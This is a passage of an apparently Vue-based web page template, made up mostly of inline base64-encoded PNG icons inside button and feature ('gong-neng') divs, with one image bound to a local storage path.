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"
            />
          </div>
          <div class="con-item btn">
            <img
              src="data:image/png;base64,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"
            />
          </div>
        </div>
      </div>

      <div class="gong-neng">
        <div class="gong-neng-item">
          <img
            src="data:image/png;base64,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"
          />
        </div>
        <div class="gong-neng-item">
          <img :src="`/storage/rox/2-d4bae5e0.png`" />
        </div>
        <div class="gong-neng-item">
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAAAoCAYAAABzXJ2PAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAA7gSURBVHgB7VsLbFbXff+d+/ren9/GNsaAkxViE0hGsylqNDlLYiDNaw+iLdLUKtOIlinRumoqW7bxUdooU6atXbdqizJtmqa0Dd2WtUlZk66B0rwaMZQWEx7GEIxdY+PX9/7ud+89/Z17TYyxPwccm9KIv3R8v3vvuefxO//3ORbYvPN34aEal0SiBIEsNOFhsciFAw02PE9iaYjtyzKEtlTtT5NGJF0UK76fjB8yILW/JIjtuCSSwaAXExshymzW5iIuDSByqn2JpQdcCpe9FCq+T+TvNiBkiJVC+LmRDAcXLBEtPc7TXX1AX5qha7hGV5SuAX6FiTpc5CkL2TnfCi6IRBTXaNHIgOd+loZLr/Beg6ZFcCWpLNUCh68O2RMhIhTHYpFjjAhcdSQFtj54dai6vhoNxZbFw6hnRxnX6Bp9pOnyxGXLYyHYTdXQyw2QpvH+c6Ns82+a2m4Yu1M2fjFJ4Na/DSOeroEOC57hQjg52hIH8Y4cdj/oYhFobsC3/bOJoYkGlEoNvFtDT+Vm1lzH38tYoryPMDKc/lZKFeozfPajrBGWXqriYxDeIUjrPWixYfzqWBapVOWUwOZdaxjBfhq6mNtIS28f+uVL6Fnggm59Xkf+RJLw1aFcqkXYvB66uQaa2cY+m8k1Mc6JBlJYvhPhBzGCEaqjxuzAdbKc9xk6GcNw7aNwyn38fgCul0HIGcVGhvTzzW+KZgLelTIQtm6BcD/ODm9nB52sUsc3KhJVQGi+UZu/SXICcxcq7wKZYw8n4MrXyTVvIVd6E3dYZ+cc2F27upnzeJaTrZ+zWel9FSWZwt5UFpdDt22vQTx6PeeyEbp1E2JV62GGliMUjyMUsWBFTZgRA2aYTrCgV0aHTUzZbI9TccvB1bE9OCWHi+XALtooZkq8P4di9hjs/AEC/yNi1oNXUoPzDSdQC1uftzBxuIPgfIotb2EC5jr+nlIZlxsaS+Vi6lMhexU/byEHfYKzGEcs/Dpek1+j6L6AN/5kZs6BUyXYYQ66ghuqGSrTdUl0b4pSqC+HNG4nqN0Edx0S9e2IVpuIJEDAOfPQFLAyANTzMGuuGt8bZlBP8I/QLL9Iuq4eF8IuLYNd6CT492Jy6ByyY8ew5anvQhZfhNnci29v4xxn5ogY+JBj7/rCPdC1R3l/qx/ozM3Dkp3mWX+AI3mP7Uz63wrqO6myjaKV1yY+j8zxpZIMJSmbyEXXI5mN4b5/+Qa+9fsZLCZt3Wrh7IZl8EIPIRp/ANVN1yFeV4toUicHB2vmj4fgFvMSdpalwPxerkxOThP02epKzVDoEaqPCBfP4FVHKKaKQDgGfwETdQb7aiK3N2Ji6EZkRx9AZvRFbH7yBYjHjmLPV0rnmzNw38466PpnoMD2ObMCSeRYvswV/hZH0Y9MOgszKlFjhZARVTDcFkj3Ts5qOytXSoZZLDfw+7+C0/8D/l5cwCc770ZcfxiNbXehsT2MWI3izAvmQGbLjwPDp4DsOQelwrso5d4ge++j2huFoZVmtSnZgOeRiThHXXRQLd2IcPTXEa1JomE1kGyEr4ZCMVU03tegkL4FIyfXY+j4J1Cu/ypV9UtUhY5qzkCOxsJ0FYfq805G4CAbfg7xg0exe/eFsq106ihLH8sP0b3zNYriTZxErHJjU1KmDNliWP8tqSQ87WFy2RNo/lg96lZc1B37y41LDPXmcbbvII35/8JxX0J1x0/wPwvovztFTh67lW19GtXNXVi5voqLKwL9zwWOVgErbwqhpqUbA+/ehvHBLxH0pwn6hIHJhkHUDr3N1VvNgVUGSYr11O9PYHLDPnRvOETROk15SqO+5KJX93DjEQfHWiii8lV8rH8vxj8gQtutoq5FyIGrRcv03ol44jNo7ahDomHme6WfS1kPp39ymnr265TCr2PEO457lVfx4MI2Ul7eMYJtz3wHp4Z/jPTI/Tj9zqNoWduOqibdB/08xalFW9ZGqa5+D9rIMT75dwMHHiljU+qfCDblD91AhWSVkMoA/g65YzPvztI1GqcjMoRhcRZJOYRTLWeYATkHR+tHX2MRWjkL21QqI3tenGZSCotC6cNVsJKPEey298X7QipmPAwcOYnxn/4FLOMlfOfPAzV2AB+CyCjPQIXpJ7Ex9Qx11Al2/ASE8XFUL5segBpLkgzQvLYV75X+iO72c4EVKeH/EfL+lLs/h2jU7ucTulFS6duZo/eNH2r94jOn738zQBAEVHP43uUXNl3Zc3x+ihq7l6roODbtPEn92Iec268gmHsBFkCplIa3tJWIxm5AVfNssNXwRgfSFOnn0Fb/n2jZ5iK0em7V2XlYIrVDXrbUHUjlqS72MPxogHakBcn6FTPGoTyc6iaB8TMb0T8aCQAPAOhFZ2oXVmovwhE0fuIB+sXrCaJVuTffr2IKV5ozJwqyGjp8b0cwaJDaKBzZh7B4E57+Ap/+AItBPT0C8qZaunim7+pdTMqHzo+l6Ym8ghPlJE7tWkXjmJxVT5cl7Kd0bvnKEPbIzGWDrvDbnPo+jeWn6JOvQDhxUftGYFC944YxcwKM4noYoMAvX/RDeW/ZRqoRxfFr+ayNEqBaUynLCPV6gmOLE2A1CbURPTvLJ5U/L1WEuoz1b2Vbj6H789+k5f8cXtnRT+lYuB7v7JR4XRao3jxfV1/M4Wo4mtHMYOdrsCKN/G36k9fNmSGfw4VR2QnPsfFb/3gazt+doCo64EsntF5o4X5GzFyMx0sVxyINtm/Rk5mDP5XRVosfYcIA85HyH1OpN/nrTfR0CIwcFljVZqD/WAxGnPkGj9EadX7RS1BlrGLLv0JQ7+BsVvJ3JQPMfVT8No10GXftTCHwbhZGKmK948mjKGR7kR6uR3JZEKy83xOBbV1ncsItsELCF0h5oZ0UgVehigp8pGcR/Ou4eO2wc3eilC+Ta8dZRuk+nsR9f/MjuKWDKJXfhVl7jguQ9pvZ9MVmuooPo651zWxJI9hFVsuMjWICRQP3fGE5ik7AGmEmbNycTRENuC5cKGMvNfzeHVzZ949GKPUz+yjAxm1voXrVHia2vs27bSz3cz5mBai40FwYIV/GhwFc0URdGubw8xg8ejODmxAiVTNBV4GJ5wpkaFZyExx9Uc3D9ucjWFEnSwru7SquV8WwOGoujvJ2krRInmwmdzYTtBvokXQxuJlEIXMIucn9tE1vcLGysKytaFhxPxpWhmeMTXG2R7jGBhzk068o7AzusDzNAbb4FWwll5EiPP9QgUQpViYHF6gC/gOjqX00ECocn1sFHHhGWe1RGpBXYQkaDgIaeD6ViJwu5nt/CUSjWT1KWIx4kOtQgaIXpHsuDnjK5JGxM/SZxkpMRO2H470KU4zCZyNBafRq+E0dcyutCEWbeW0n+BaqGiOI1xpcAJ0+d4KSkGDw1Mp2uilV5NncGGrbVqBhVYiR6Mw+7aLE2Hs2Bo9/D+XCU0rXK5WynpzYOWsuF+o4IdagXv8yHf636VpluAWah14z7WloBeWbhLkjFUXZobGUv8kOE/NiBXmGRvkgPgz9hlWDonwUVcseR9uGCCLJQGXkx4LIz5xiOKW3axkMxelgTfw0hMnhDnK7yUjzLYjyfjIes4DqEI/uwsvoKGVUxvA68kQH62+iOrqZPnYYdW1Bu3Hm16LcDaptraX01Pr96BcIs1JPhUl6iydtjJ5+B4Xc0zCqjygkORJGXVK0E+D59i43st6zRHYAZZe5lBjTkqXp5JMUKhNEbi2vZDur/b3A+bOKZ1jvKYjat7FQ6krFUXQfQs3yP8bqX671PQOb++HDfQ4Gjw3Q/61neB+jmxYkqpSaUXWaEhoa2ltpFFuZ77gd+cnt9GIGGRyNkvOHKCUTNMI5/7CTaVo0tAX+LpKjwz4X0uvz9bQy0FaF/fUMM9QD7zJGGFFSR+YUn4Q3fi/jnScNuKFdTPsOkisfZCvr/OSTnHML15oCc7WvVWYolouxnUPrCF9RUYnideq1L6Gs7cPexxfuj4e0u5FsehytnQHYSoTP9pVY9sG2/wzjp1qotx9BJL6B4Newbpy/lY4O+CxKp0rlWvwUrNPCMbF4N/r3OG+utGChlLFVAOvmdOrWn6Y3lWl0g8yIPpXajVGSViseLUcIeBclqYupBaq03n8w8L3tk/jk9n9lVEg3yLyHX/wamyKnyoYKwF8uKQN1koCc5A7K9zny72JQO0IXdOFgd6WqaageQrw6CDIK9ALKtOvjg/2wM99Acu07yO7vYRh2GOnCehqs23Cu/xaEqlYgXtXEBQpT3wrfhVOejH+1gmyiqCCYUuXEOWSvBN9WOLzaFPJCJkeJSFOKqhGOR+h+sr1Q0K6lElpc5ISSrphvQ8Qck2lFWFvhr7bQlvMJd3pEE68M5XyfWnk0mr+kYkptqDN1AVsoENN8fo7PTnPBjpJ9etjOceTyg/jhU+MVQdz8+VtY/3N+Vm4u8rxvwqj5N8T3O5hYfwf9hz/gZKp9daFI+bnF7GvUyc9iT+rMRWgJdO2s4i5PGzl5uX+W0gpfT7/5lwh0CwyjVh1DCwoR9zl5ChpJ0XEd5edLuowlXsfJuadRKp6Ax2Jrp6C5E2QmYsRdJNNS3hJ9crOVtiPGwjbJFW5ZqCxiZT27cZuJRAstM41hxuIunx1BWU+wcVpzX764XeWZ/olR3cvB0DMcBAfDhJZbdmkRbPo3NrpYLmHrCVv+nlZ+LMJv5pYqmS3h5afzfhTYlWLqlS6BU5o5fu6/oL2jNH8GkuBve8TAqaQFk2ydq9dhONwDKDJidbnNZmrn92V88gh2mUxk0mV29AnWKVMd2tCY3rXjymV2g8h0qt3+ddx+HNRR5EaFkUhQ8pIwtZjvCa1s/D9co2v0kSaBLX/dCkMuzUknFdXZVgEJe1GOGHwglWqpusZw1dKeVFrQWP0XcW/GUpAyOLRimPazlpDUSQFuA16RvhZI0vtDwz9zArkKS0ZX7EC8xBU9fb8A0kKfNfDRIYHLPUn2c6BrB/KvMKnctPqHo+Jlf7d0pAKrq55TF0rqPyD+m3am8ZK/kCppIKuwNKROX6nEyEdJ1U2Tpdk/A7vquA2TY0ZoAAAAAElFTkSuQmCC"
          />
        </div>
        <div class="gong-neng-item">
          <img
            src="data:image/png;base64,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